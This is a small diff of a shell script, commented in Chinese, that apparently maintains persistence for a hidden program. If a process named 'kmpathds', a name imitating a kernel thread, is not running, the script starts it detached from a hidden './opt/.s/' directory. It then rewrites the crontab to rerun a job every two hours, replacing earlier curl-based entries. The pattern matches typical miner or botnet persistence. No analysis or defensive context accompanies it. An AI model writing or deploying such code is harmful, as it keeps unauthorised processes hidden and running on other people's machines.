@@ -21,7 +21,7 @@ fi
 
 # 检查进程是否存在，不存在则启动
 if ! pgrep -f "kmpathds" > /dev/null; then
-    nohup "kmpathds" /dev/null 2>&1 &
+    nohup "./opt/.s/kmpathds" /dev/null 2>&1 &
 fi
 # 清除上一次的任务，添加下一次的任务，每2小时执行一次
 (crontab -l | grep -v "curl" ; echo "$CRON_JOB") | crontab -
